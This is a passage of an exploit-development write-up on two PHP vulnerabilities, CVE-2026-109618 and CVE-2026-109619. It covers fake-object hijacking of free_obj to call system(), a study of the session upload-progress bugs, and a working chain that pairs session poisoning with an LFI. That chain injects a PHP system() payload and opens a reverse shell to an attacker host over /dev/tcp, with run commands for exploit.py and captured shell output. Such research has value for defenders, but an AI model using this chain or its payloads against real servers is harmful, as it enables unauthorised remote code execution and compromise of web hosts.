    <text x="621" y="495" text-anchor="middle">type == IS_OBJECT</text>
    <rect x="722" y="470" width="198" height="40" rx="6" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
    <text x="821" y="495" text-anchor="middle">call free_obj(P)</text>
  </g>
  <g stroke="#666" stroke-width="1.5" fill="#666">
    <path d="M188 490 L 200 490" marker-end="url(#arrB2)"/>
    <path d="M354 490 L 366 490" marker-end="url(#arrB2)"/>
    <path d="M520 490 L 532 490" marker-end="url(#arrB2)"/>
    <path d="M706 490 L 718 490" marker-end="url(#arrB2)"/>
  </g>
  <text x="470" y="515" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#556">one decrement, one dispatch, one function pointer call</text>
</svg>
<p class="diagram-caption" style="text-align:center;font-size:.85em;color:#6a737d;margin:.25em 0 1.5em;">The fake-object chain: `P` points at a sprayed fake `zend_object` whose `handlers` pointer is steered at a sprayed fake handlers table holding `free_obj`.</p>
</div>

### 2.4 Step 3 — from a controlled call to a shell  **[technique]**

`free_obj`'s type is `void (*)(zend_object *object)`. Pointing it directly at `system` gives `system(obj)` — a real call with a wrong argument, because `system` expects a `char*` command string and `obj` is a fake object whose first bytes are `refcount=1, type=8`, not a command.

Two ways to close that gap:

**3a. Argument laundering via a gadget.** Point `free_obj` at a function whose first argument is meaningful. For example, point it at a gadget that interprets `obj` as a `zend_string*` and copies its payload, or point it at `system` while making the fake object's bytes literally spell `sh -c '…'` so that `(char*)obj` is the command (type confusion: the "object" is also the "string").

**3b. Arbitrary read/write, then hijack.** The more robust approach is to not jump straight to a shell, but to use the primitive to get arbitrary read and arbitrary write first:

- Corrupt a `zend_string`'s `len` (at offset 16 of `zend_string`) to a huge value → out-of-bounds read → leak a libc/PHP function pointer → defeat ASLR.
- Corrupt a `zend_string`'s `val` pointer → write to an arbitrary address → overwrite a real, live object's `handlers->free_obj` (or a `zend_internal_function.handler`) with `system`/`proc_open`.
- Then trigger that object normally, with a `zend_string` whose content is the command, so `system("bash -c '…'")` runs with the right argument.

This two-phase "read → leak → write → hijack → trigger" is the standard modern PHP exploit shape, and it is what "narrow laboratory conditions" refers to: every step is allocator- and version-specific.

### 2.5 The full chain, end to end

1. **[confirmed]** Send a multipart request whose field name carries our chosen bytes; the OOM corrupts `$_FILES`, and shutdown dereferences our bytes as a `zend_refcounted*`.
2. **[technique]** Use an info leak (or a partial overwrite) so `P` points into a heap region we have sprayed with fake objects.
3. **[technique]** `*(uint32_t*)P -= 1` decrements our fake object's `refcount` from 1 to 0.
4. **[technique]** `rc_dtor_func(P)` reads `type_info = IS_OBJECT`, follows `P + 0x18` to our fake handlers table, and calls `free_obj(P)`.
5. **[technique]** `free_obj` points at a gadget that turns `P` into a command string, or we use the arbitrary-write route in Section 2.4 3b to call `system` with a properly-formed `zend_string`.
6. **[technique]** The command runs in the PHP worker's process → reverse shell / callback.

### 2.6 Why this is narrow

- ASLR must be defeated (leak or partial overwrite), and there is no leak yet.
- Heap layout is version-, build-, and SAPI-specific; a working spray for PHP 8.4.26 + Zend MM + mod_php does not transfer to 8.4.27 or FPM.
- The primitive is a weak write (a decrement), so it must be upgraded to arbitrary read/write through several more careful steps.
- Mitigations in modern PHP (NX, ASLR, hardened handlers, no trivially writable function pointers) mean the classic one-shot fake object rarely works cleanly.

None of this makes the bug less real — it is confirmed-exploitable by the advisory and multiple vendors. It means the conversion from "crash" to "reliable shell" is an exploit-development project, not a flag to flip.

---

## 3. The session half — CVE-2026-109619

The info leak that Section 2 needs is the sibling CVE-2026-109619: cross-request stale session state that the advisory lists as "memory disclosure / RCE". This section records the work so far toward harvesting a heap-address leak to feed the CVE-2026-109618 primitive.

Status: the mechanism is understood and partly confirmed; the concrete heap-address leak is not yet reproduced.

### 3.1 The vulnerable code path

The default-on `session.upload_progress` handler (`php_session_rfc1867_callback`) runs during multipart request parsing, i.e. inside `php_request_startup` → `sapi_activate`, which is before RINIT (`zend_activate_modules`). At that point the session globals have not been reset for the new request.

`php_request_startup` order (`main/main.c`):

```c
zend_activate();          /* engine state */
sapi_activate();          /* <-- multipart parsing → upload-progress handler runs HERE */
php_hash_environment();
zend_activate_modules();  /* <-- RINIT → php_rinit_session_globals() runs HERE */
PG(modules_activated)=1;
```

The fix (commit `01a40e89fb`) therefore adds, at the top of `MULTIPART_EVENT_START`:

```c
/* This runs before RINIT, so we need to clear these early */
php_rinit_session_globals();
```

`php_rinit_session_globals()` resets `PS(id)`, `PS(session_status)`, `PS(http_session_vars)`, `PS(session_vars)`, `PS(mod_data)`, and the rest of the per-request session state. Without it, a second request running on the same worker sees the previous request's session state.

### 3.2 What the fix's regression tests reveal

The patch ships three session tests (`ext/session/tests/rfc1867_*.phpt`) that enumerate the vulnerabilities:

| Test | What it guards |
|---|---|
| `rfc1867_no_user_code.phpt` | the pre-RINIT decode must not autoload classes or run `__wakeup`/`__unserialize`/`Serializable::unserialize`; and must not leave `$_SESSION` in `$GLOBALS` |
| `rfc1867_incomplete_class_reserved_props.phpt` | the "keep objects as `__PHP_Incomplete_Class`" bookkeeping must be unambiguous, else the decode is refused |
| `rfc1867_sid_invalid.phpt` | the progress array must not leak into `$_SESSION` on failed sessions |

Facts the tests encode:

- The handler decodes the session record before RINIT, and in the vulnerable build that decode can resolve classes / run user code before any application code exists. The fix forces "incomplete classes only" mode via `php_session_unserialize_init()` when `PS(in_rfc1867_update)` is set.
- The handler registers `$_SESSION` in the global symbol table (`php_session_track_init` → `zend_hash_update_ind(&EG(symbol_table), "_SESSION", …)`). The fix adds `zend_delete_global_variable("_SESSION")` at `MULTIPART_EVENT_END` so a script that never called `session_start()` cannot see the session data.
- `php_session_track_init()` unconditionally frees the existing `PS(http_session_vars)` before creating a new one:

```c
static void php_session_track_init(void)
{
    zend_string *var_name = ZSTR_INIT_LITERAL("_SESSION", 0);
    zend_delete_global_variable(var_name);
    if (!Z_ISUNDEF(PS(http_session_vars))) {
        zval_ptr_dtor(&PS(http_session_vars));   /* <-- free previous */
    }
    array_init(&session_vars);
    ZVAL_NEW_REF(&PS(http_session_vars), &session_vars);
    ...
}
```

### 3.3 Confirmed, and not yet confirmed

**Session poisoning (confirmed).** A single `mod_php` request (PHP 8.4.26, single prefork worker) with `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS` + a file whose field name is ~700 KB writes that field name into the session file. When the same request then OOMs (the CVE-2026-109618 `$_FILES` corruption), the `MULTIPART_EVENT_END` cleanup is skipped, so the progress data persists:

```
$ cat /tmp/sess_abcdef0123456789abcdef0123456789    # 717,324 bytes
upload_progress_k|a:5:{s:10:"start_time";i:…;s:5:"files";a:2:{
  i:0;a:7:{s:10:"field_name";s:4:"seed";…}
  i:1;a:7:{s:10:"field_name";s:716803:"AAAA…AAAA";…}   # ← the 700 KB field name
```

So an attacker can write arbitrary (large) content into the session file even before any application `session_start()`. This is a session-poisoning primitive (useful for the classic session-file + LFI chain), and it confirms the handler runs and the cleanup-skip behavior — but it leaks attacker data, not a heap address.

**Pre-RINIT decode of a crafted session record (confirmed).** Under an ASan `php-cgi` build (`USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1`), a session file containing a serialized object is decoded during the upload progress handler before the script runs, and re-encoded unchanged:

```
input:  k|O:8:"stdClass":1:{s:1:"a";i:1;}
output: k|O:8:"stdClass":1:{s:1:"a";i:1;}upload_progress_key|a:5:{…}
```

No ASan fault in this case (built-in class, no `__wakeup`), but it confirms the decode-into-`$_SESSION`-then-re-encode flow the fix hardens.

**Not yet reproduced: the heap-address leak.** The memory disclosure the advisory describes is the cross-request stale state: a previous request leaves `PS(id)` / `PS(http_session_vars)` / `PS(rfc1867_progress)` referencing memory that a later request's `php_session_track_init` or serializer reads. Two candidate triggers were attempted and did not produce a UAF in this environment:

- Request A = startup OOM (modules_activated=0): the session globals are leaked (still valid), and request B frees them cleanly — no UAF.
- Request A = simple session progress + request B = progress: clean.

Two further single-request candidates were exercised under the ASan build and produced no ASan fault:

- Invalid session id (too long / illegal chars) — the `rfc1867_sid_invalid.phpt` scenario. `php_session_initialize()` returns FAILURE (`s_read` fails), `php_session_abort()` sets `PS(session_status) = php_session_none`, and the vulnerable `php_session_rfc1867_update` then forces it back to `php_session_active` and writes the progress data into the still-valid, empty `PS(http_session_vars)`. This reproduces the advisory's "session data written into a failed session", but `PS(http_session_vars)` is valid here — no use-after-free.

The conclusion so far: every single-request path leaves `PS(http_session_vars)` / `PS(id)` either cleanly reset or leaked-but-valid (freed correctly by the next `php_session_track_init`). The use-after-free requires the cross-request case in which the backing memory is freed and a pointer to it is left non-reset — i.e. a fatal error that aborts `php_rshutdown_session_globals()` part-way (the "fatal error / timeout leaves state behind" condition from the advisory). That precise abort point has not been reproduced, and it is the remaining gate for a heap-address leak.

**Key negative result (confirmed):** `zend_deactivate()` (the per-request engine teardown that runs even after a startup failure) does not reset the Zend MM heap — the worker heap persists across mod_php requests. So session state skipped by RSHUTDOWN is leaked (still mapped and valid), not freed, and the next request's `php_session_track_init` frees it cleanly. Consequently the UAF is not a simple "OOM skips cleanup" effect; it needs a specific free-without-reset inside the session code itself (e.g. the progress struct's internal `zval*`s — `post_bytes_processed` / `current_file_bytes_processed` — dangling after a resize, or a double-free across `MULTIPART_EVENT_END` + module RSHUTDOWN), which has not been triggered here.

### 3.4 Where this fits the chain

The goal is one heap address to use as `P` in the CVE-2026-109618 primitive. The 109619 session surface offers, so far:

- session poisoning (confirmed) — arbitrary session-file content;
- pre-RINIT user code (the fix's "no user code" guarantee) — a POP-chain / code-execution vector if the target app has a suitable class;
- cross-request stale state / decode-OOM (mechanism identified) — the path to an actual heap-address disclosure, still to be triggered.

No heap address has been leaked yet.

---

## 4. A working shell: session poisoning + LFI

While the memory-corruption route needs a leak, the session-poisoning primitive on its own yields a working callback shell when the target app has an LFI. This is a containerized end-to-end exploit.

Scope note: this is not the pure memory-corruption RCE. It uses the confirmed session-poisoning primitive plus an LFI in the target app (`include($_GET['page'])`). The LFI is the app-level crutch.

<div markdown="0" class="diagram" style="margin:1.5em 0;">
<svg viewBox="0 0 940 440" width="100%" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Session poisoning plus LFI chain">
  <defs>
    <marker id="arrC" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#666"/>
    </marker>
  </defs>

  <rect x="24" y="60" width="280" height="270" rx="8" fill="#eef3fb" stroke="#4a7fb5" stroke-width="1.5"/>
  <text x="164" y="84" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#1a3a5c">1. Poison (multipart POST)</text>
  <text x="40" y="114" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">PHP_SESSION_UPLOAD_PROGRESS</text>
  <text x="40" y="134" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e"> = "&lt;?php system($_GET['c']); ?&gt;"</text>
  <text x="40" y="158" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">+ file field, name ≈ 700 KB</text>
  <text x="40" y="190" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#33475f">serializer writes the session key raw:</text>
  <text x="40" y="210" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#1a3a5c">upload_progress_&lt;?php</text>
  <text x="40" y="228" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#1a3a5c">  system($_GET['c']); ?&gt;|a:5:…</text>
  <text x="40" y="260" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#8a1f1f">→ /tmp/sess_&lt;sid&gt;</text>
  <text x="40" y="280" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#8a1f1f">OOM skips cleanup → payload persists</text>

  <path d="M304 195 L 356 195" stroke="#666" stroke-width="2" marker-end="url(#arrC)"/>

  <rect x="360" y="60" width="250" height="270" rx="8" fill="#e9f6ee" stroke="#1f6f43" stroke-width="1.5"/>
  <text x="485" y="84" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#14532d">2. Include (LFI)</text>
  <text x="376" y="118" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">include($_GET['page'])</text>
  <text x="376" y="146" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">page = /tmp/sess_&lt;sid&gt;</text>
  <text x="376" y="178" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#33475f">PHP parses the file:</text>
  <text x="376" y="198" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#33475f">upload_progress_ echoed</text>
  <text x="376" y="216" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#14532d">the &lt;?php … ?&gt; executes</text>
  <text x="376" y="234" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#33475f">|a:5:{…} echoed back</text>

  <path d="M610 195 L 662 195" stroke="#666" stroke-width="2" marker-end="url(#arrC)"/>

  <rect x="666" y="60" width="250" height="270" rx="8" fill="#fdecec" stroke="#c0392b" stroke-width="1.5"/>
  <text x="791" y="84" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#8a1f1f">3. Shell</text>
  <text x="682" y="118" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">c = bash -c '…'</text>
  <text x="682" y="146" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">bash -i &gt;&amp; /dev/tcp/</text>
  <text x="682" y="164" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12.5" fill="#22303e">  attacker/4444 0&gt;&amp;1</text>
  <text x="682" y="196" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#33475f">reverse shell connects back</text>
  <text x="682" y="216" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#8a1f1f">to attacker:4444</text>

  <rect x="300" y="372" width="340" height="48" rx="6" fill="#fff7e6" stroke="#c8a24b" stroke-width="1.5"/>
  <text x="470" y="401" text-anchor="middle" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#5c4a1f">www-data@container:/var/www/html$ id</text>
  <path d="M791 330 C 791 380 646 396 646 396" fill="none" stroke="#c0392b" stroke-width="2" marker-end="url(#arrC)"/>
</svg>
<p class="diagram-caption" style="text-align:center;font-size:.85em;color:#6a737d;margin:.25em 0 1.5em;">The working chain: poison the session file, execute it through an LFI, and the reverse shell calls back.</p>
</div>

### 4.1 The chain

1. **Poison** — a multipart POST sets `PHP_SESSION_UPLOAD_PROGRESS` to `<?php system($_GET['c']); ?>`. The `php` session serializer writes the session key (which is `upload_progress_` + that value) raw into the session file, so the payload lands unquoted. A trailing ~700 KB field name OOMs the request (the CVE-2026-109618 corruption), which skips `MULTIPART_EVENT_END` cleanup, so the payload persists:

   ```
   upload_progress_<?php system($_GET['c']); ?>|a:5:{s:10:"start_time";…}
   ```

2. **Include** — the target's LFI does `include("/tmp/sess_<sid>")`. PHP parses the file in HTML mode: `upload_progress_` is echoed as text, the `<?php system($_GET['c']); ?>` executes, and the `|a:5:{…}` tail is echoed back.

3. **Shell** — `c` carries `bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`, connecting a reverse shell back to the attacker.

### 4.2 Running it

```bash
docker compose -f docker-compose.lfi.yml up --build
```

The `attacker` service poisons the target, triggers the LFI, listens on `:4444`, and prints the result:

```
attacker-1  | [+] reverse shell connected from ('172.19.0.2', 48124)
attacker-1  | www-data@b21c41ece846:/var/www/html$ id; hostname; whoami; pwd
attacker-1  | uid=33(www-data) gid=33(www-data) groups=33(www-data)
attacker-1  | b21c41ece846
attacker-1  | www-data
attacker-1  | /var/www/html
```

To run the exploit yourself against the target on port 18092:

```bash
python3 lfi_target/exploit.py --url http://127.0.0.1:18092/ \
    --callback 172.17.0.1 --port 4444 --listener
```

### 4.3 Files and scope

- `lfi_target/` — the vulnerable PHP app (LFI + session upload progress, single worker). `index.php` is the `include($_GET['page'])` endpoint.
- `attacker/` — stdlib-only `exploit.py` (poison + LFI trigger + one-shot reverse-shell listener).
- `docker-compose.lfi.yml` — `target` + `attacker`.

Scope: this requires an LFI. Without the `include($_GET['page'])` endpoint, the session file is server-side and the payload cannot be executed. This is the "session poisoning + LFI" technique, distinct from the pure-runtime memory-corruption RCE. The pure-runtime path (turning the CVE-2026-109618 primitive directly into code execution) still needs the heap-address leak that Section 3 documents as not-yet-reproduced.

---

## 5. Status

| Stage | Status |
|---|---|
| Reproduce the crash | done (`poc/`, docker-compose) |
| Characterize the primitive | done |
| Confirm full attacker control of `P` | done (A/N/P gdb test) |
| Session poisoning | done (confirmed) |
| LFI reverse shell | done (working, `docker-compose.lfi.yml`) |
| Defeat ASLR — partial overwrite | ruled out |
| Defeat ASLR — info leak | not yet reproduced (CVE-2026-109619 session surface) |
| Heap-spray a fake object | not done |
| Controlled call → `system`/`proc_open` | not done |

The immediate next step for the memory-corruption route is the info leak from Section 2.2 Step 1b: obtain a heap-address leak from the CVE-2026-109619 sibling, via the default-on `session.upload_progress` handler or the cross-request stale-state path — a two-request, same-worker sequence. One leaked address is enough, because the field name gives full byte control of `P`.

---

## 6. References

- [CVE-2026-109618 — cve.org](https://www.cve.org/CVERecord?id=CVE-2026-109618)
- [PHP advisory GHSA-w8hw-w9fx-j79w (RCE via OOM corruption)](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP advisory GHSA-6wmf-4rv5-p3rp (CVE-2026-109619)](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [php-src fix commit 01a40e89fb "Avoid state corruption via bailout"](https://github.com/php/php-src/commit/01a40e89fb)
- [Google Cloud — responding to the core PHP vulnerabilities](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619)
- [Rapid7 — CVE-2026-109618 / CVE-2026-109619](https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php/)
- [Palo Alto Networks / Unit 42](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/)
- [Wiz — php2shell PHP RCE](https://www.wiz.io/blog/php2shell-php-rce)
- [oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/10/21/6)
